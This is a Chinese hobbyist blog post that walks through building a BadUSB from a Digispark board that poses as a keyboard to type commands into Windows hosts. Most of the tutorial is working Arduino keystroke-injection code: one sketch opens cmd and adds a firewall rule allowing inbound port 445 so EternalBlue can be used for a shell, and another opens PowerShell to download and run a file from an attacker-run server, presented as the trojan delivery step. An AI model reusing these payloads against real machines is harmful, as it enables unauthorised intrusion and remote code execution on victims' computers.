<!DOCTYPE html><html class="theme-next mist use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="theme-color" content="#222"><script src="/lib/pace/pace.min.js?v=1.0.2"></script><link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Megrim:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4"><link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222"><meta name="keywords" content="硬件安全,"><meta name="description" content="写在前面&amp;emsp;&amp;emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大"><meta name="keywords" content="硬件安全"><meta property="og:type" content="article"><meta property="og:title" content="badusb的学习记录&amp;入侵windows主机"><meta property="og:url" content="http://yoursite.com/2018/06/12/badusb/index.html"><meta property="og:site_name" content="Lzy-wi&#39;Blog"><meta property="og:description" content="写在前面&amp;emsp;&amp;emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大"><meta property="og:locale" content="zh-Hans"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/badusb.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/xixixi.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/1.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/2.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/3.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/4.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/xixixi.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/jiaocheng.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/emmm.jpg"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/7.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/final.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/6.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/1.gif"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/8.png"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/9.jpg"><meta property="og:image" content="http://yoursite.com/img/2018-06-12/445.png"><meta property="og:updated_time" content="2018-06-13T04:46:34.132Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="badusb的学习记录&amp;入侵windows主机"><meta name="twitter:description" content="写在前面&amp;emsp;&amp;emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大"><meta name="twitter:image" content="http://yoursite.com/img/2018-06-12/badusb.png"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Mist",version:"5.1.4",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!0,onmobile:!1},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="http://yoursite.com/2018/06/12/badusb/"><title>badusb的学习记录&入侵windows主机 | Lzy-wi'Blog</title></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div> <a href="https://github.com/Lzy-wi" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513;color:#fff;position:absolute;top:0;border:0;right:0" aria-hidden="true"><path d="M0 0 115 115 130 115 142 142 250 250 250 0Z"></path><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4L133.7 101.6C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">Lzy-wi'Blog</span><span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">这个人比较懒</p></div><div class="site-nav-toggle"> <button><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br> 首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br> 关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br> 标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br> 归档</a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/12/badusb/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Lzy-wi"><meta itemprop="description" content=""><meta itemprop="image" content="/img/touxiang.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lzy-wi'Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">badusb的学习记录&入侵windows主机</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-12T00:35:47+08:00">2018-06-12</time></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/06/12/badusb/#comments" itemprop="discussionUrl"><span class="post-comments-count gitment-comments-count" data-xid="/2018/06/12/badusb/" itemprop="commentsCount"></span></a></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>&emsp;&emsp;对于人们熟悉的网络安全，一旦发现漏洞可以很快的应对和修补，然而对于硬件安全，漏洞的危害即使不是很大也要耗费很大的人力物力才可以把有问题的设施更换掉，对于一些比更大的漏洞就更加难并且花费巨大<br><a id="more"></a></p><h4 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h4><p><img src="/img/2018-06-12/badusb.png" alt="badusb"><br>&emsp;&emsp;灯灯灯凳，这个就是我们的主角啦<br>&emsp;&emsp;对于第一次玩硬件的小伙伴，硬件入门不难，但是要有耐心，很多时候是需要不断的去调试代码，查找资料，所以一定要有耐心。</p><h5 id="一、U盘的结构"><a href="#一、U盘的结构" class="headerlink" title="一、U盘的结构"></a>一、U盘的结构</h5><p>&emsp;&emsp;要想理解badusb攻击的方法就要先了解U盘的结构，U盘的主要结构如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|--------|---------------|</span><br><span class="line">|  固件  |   数据存储区   |</span><br><span class="line">|--------|---------------|</span><br></pre></td></tr></table></figure><p></p><p> &emsp;&emsp;U盘由芯片控制器和闪存两部分组成（也间接说明为什么U盘的额空间总是不够写的那么大），芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</p><h5 id="usb协议"><a href="#usb协议" class="headerlink" title="usb协议"></a>usb协议</h5><p>&emsp;&emsp;现在很多设备都是用usb接口，摄像头、U盘、鼠标、键盘，无线键鼠的接收器，等等，为了兼容这么多设备，设计USB协议标准的时候就没有要求每个USB设备向网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备多个输入输出设备的特征。<br>&emsp;&emsp;问题就是在这里，当你插进一个U盘时电脑并没有鉴别你的U盘到是不是真的U盘，这样我们就有机可乘了<br><img src="/img/2018-06-12/xixixi.png" alt="xixixi"></p><h5 id="入侵原理"><a href="#入侵原理" class="headerlink" title="入侵原理"></a>入侵原理</h5><p>正常的U盘插到电脑里的大概流程是下面这样的<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">           电脑识别为U盘的固件</span><br><span class="line">固件信息--------------------------&gt;U盘-----&gt;读取U盘的内容-----&gt;示U盘的内容</span><br></pre></td></tr></table></figure><p></p><p>构造badusb的固件让电脑识别为键盘<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">           电脑识别为键盘的固件</span><br><span class="line">固件信息--------------------------&gt;键盘</span><br></pre></td></tr></table></figure><p></p><p>再构造里面的内容<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">键盘-----&gt;模拟人敲命令-----&gt;根据写好的脚本敲命令</span><br></pre></td></tr></table></figure><p></p><h5 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h5><p>&emsp;&emsp;材料清单</p><ul><li>Digispark（也就是我们的主角）</li><li>Arduino（编写以及把脚本写到badusb里的程序）</li><li>脚本</li></ul><h4 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h4><h5 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h5><p>驱动下载地址，链接：<a href="http://pan.baidu.com/s/1i4K10dn" target="_blank" rel="noopener">http://pan.baidu.com/s/1i4K10dn</a> 密码：ilaf<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载好后运行`DPinst64.exe`，32位系统点击`DPinst.exe`,一路回车等待安装完成</span><br><span class="line">下载编写程序的开发软件[https://www.arduino.cc/en/Main/Software](https://www.arduino.cc/en/Main/Software)</span><br><span class="line">运行Arduino，在首选项中添加开发板网址[http://digistump.com/package_digistump_index.json](http://digistump.com/package_digistump_index.json)(不同的板网址不同)</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-06-12/1.png" alt="1"><br>在工具–&gt;开发板–&gt;开发板管理器里，下载这个驱动,等待下载完成即可<br><img src="/img/2018-06-12/2.png" alt="2"><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">选择Digispark开发板</span><br><span class="line">编译器选择USBtinyISP</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-06-12/3.png" alt="3"><br><img src="/img/2018-06-12/4.png" alt="4"><br>到这里所有准备就做好了<br><img src="/img/2018-06-12/xixixi.png" alt="xixixi"></p><h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><p>先看一眼商家给的教程<br><img src="/img/2018-06-12/jiaocheng.png" alt="jiaocheng"><br><img src="/img/2018-06-12/emmm.jpg" alt="emmm..."><br>在我的印象中应该是写一个木马进固件然后一插进电脑就黑进去的啊[捂脸][捂脸][捂脸]<br>算了，先一步一步跟着教程摸索下<br>最终代码如下，修改了一点点<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define KEY_ESC     41</span><br><span class="line">#define KEY_BACKSPACE 42</span><br><span class="line">#define KEY_TAB     43</span><br><span class="line">#define KEY_PRT_SCR 70</span><br><span class="line">#define KEY_DELETE  76</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(5000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0);</span><br><span class="line">DigiKeyboard.delay(5000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;cmd&quot;));</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;echo&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.print(F(&quot; &quot;));</span><br><span class="line">DigiKeyboard.print(F(&quot;Team233&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>编译…没问题,上传…O98k<br><img src="/img/2018-06-12/7.png" alt="7"><br>激动人心的时候到了，重新插进电脑去,10秒后…<br><img src="/img/2018-06-12/final.png" alt="final"><br><img src="/img/2018-06-12/6.png" alt="6"><br>到目前为止就算badusb就算做好了</p><h4 id="进阶教程"><a href="#进阶教程" class="headerlink" title="进阶教程"></a>进阶教程</h4><p>上面只是简单的尝试，接下来要进行更高级的用法<br><img src="/img/2018-06-12/1.gif" alt="gif"><br>然鹅。。。。。<br><img src="/img/2018-06-12/8.png" alt="8"><br><img src="/img/2018-06-12/9.jpg" alt="9"><br>只有这么点容量怎么写马，而且商家没说，网上也找不到，怎么写。。。。。<br>忽然想起当时买这个的时候有好多个版本。。。<br>我绝对不会告诉你我是因为它<b><del>比较便宜</del></b>体积小迷你好看才买它的<br>经过我一番沉思与实践之后<br>如果目标是win7系统，我们可以利用终端打开445端口，然后使用永恒之蓝漏洞直接getshell<br>如果目标是win10，我们可以从我们搭好的服务器下载木马饭后执行木马程序，对win7也同样适用<br>cmd开启445端口命令如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;open 445&quot; dir=in action=allow protocol=TCP localport=445</span><br></pre></td></tr></table></figure><p></p><p>编写好的脚本代码如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define KEY_ESC     41</span><br><span class="line">#define KEY_BACKSPACE 42</span><br><span class="line">#define KEY_TAB     43</span><br><span class="line">#define KEY_PRT_SCR 70</span><br><span class="line">#define KEY_DELETE  76</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">DigiKeyboard.delay(5000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0);</span><br><span class="line">DigiKeyboard.delay(5000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;cmd&quot;));</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;netsh advfirewall firewall add rule name=&quot;)); </span><br><span class="line">DigiKeyboard.print(char(34)); </span><br><span class="line">DigiKeyboard.print(F(&quot;open445&quot;)); </span><br><span class="line">DigiKeyboard.print(char(34)); </span><br><span class="line">DigiKeyboard.print(F(&quot; dir=in protocol=tcp localport=445 action=allow&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在kali下nmap可以看到445端口已经打开,msf直接漏洞利用就可以实现getshell<br><img src="/img/2018-06-12/445.png" alt="445"><br>win10系统下载测试文件Team233.png的脚本代码如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define KEY_ESC     41</span><br><span class="line">#define KEY_BACKSPACE 42</span><br><span class="line">#define KEY_TAB     43</span><br><span class="line">#define KEY_PRT_SCR 70</span><br><span class="line">#define KEY_DELETE  76</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">DigiKeyboard.delay(5000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0);</span><br><span class="line">DigiKeyboard.delay(5000);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;pow&quot;));</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.delay(500);</span><br><span class="line">DigiKeyboard.print(F(&quot;$client = new-object System.Net.WebClient&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.print(F(&quot; $client.DownloadFile(&apos;http://192.168.1.2/Team233.png&apos;, &apos;.&quot;)); </span><br><span class="line">DigiKeyboard.print(char(92)); </span><br><span class="line">DigiKeyboard.print(F(&quot;Team233.png&apos;)&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.print(F(&quot;.&quot;));</span><br><span class="line">DigiKeyboard.print(char(92)); </span><br><span class="line">DigiKeyboard.print(F(&quot;Team233.png&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>效果就参考我录的视频吧<br>链接: <a href="https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1m8Ob16yuFoNVjzHoz6VrNQ</a> 密码: c9he<br><b>未经允许不得传播</b><br><b>本文仅供学习之用，不负任何法律责任<b></b></b></p></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/硬件安全/" rel="tag"><i class="fa fa-tag"></i> 硬件安全</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2018/05/22/writeup1/" rel="next" title="RCTF部分wirteup"><i class="fa fa-chevron-left"></i> RCTF部分wirteup</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"> <a href="/2018/07/20/sqli-labs1/" rel="prev" title="sqli-labs的学习记录（1-8）">sqli-labs的学习记录（1-8）<i class="fa fa-chevron-right"></i></a></div></div></footer></div></article><div class="post-spread"></div></div></div><div class="comments" id="comments"><div id="gitment-container"></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap"> 文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap"> 站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/img/touxiang.jpg" alt="Lzy-wi"><p class="site-author-name" itemprop="name">Lzy-wi</p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/index.html"><span class="site-state-item-count">12</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/Lzy-wi" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a href="mailto:1721389906@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i> E-Mail</a></span></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#知识准备"><span class="nav-number">1.1.</span> <span class="nav-text">知识准备</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、U盘的结构"><span class="nav-number">1.1.1.</span> <span class="nav-text">一、U盘的结构</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#usb协议"><span class="nav-number">1.1.2.</span> <span class="nav-text">usb协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#入侵原理"><span class="nav-number">1.1.3.</span> <span class="nav-text">入侵原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#材料准备"><span class="nav-number">1.1.4.</span> <span class="nav-text">材料准备</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开干"><span class="nav-number">1.2.</span> <span class="nav-text">开干</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#安装驱动"><span class="nav-number">1.2.1.</span> <span class="nav-text">安装驱动</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#写脚本"><span class="nav-number">1.2.2.</span> <span class="nav-text">写脚本</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#进阶教程"><span class="nav-number">1.3.</span> <span class="nav-text">进阶教程</span></a></li></ol></li></ol></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright" style="text-align:center">&copy; <span itemprop="copyrightYear">2018</span><span class="with-love"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">Lzy-wi</span></div><div style="text-align:center"><div class="powered-by"><i class="fa fa-user-md"></i> <span id="busuanzi_container_site_uv">本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="theme-info"><div class="powered-by"></div> <span class="post-count">博客全站共11.5k字</span></div></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css"><script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script><style>a.gitment-editor-footer-tip{display:none}.gitment-container.gitment-footer-container{display:none}</style><script type="text/javascript">function renderGitment(){new 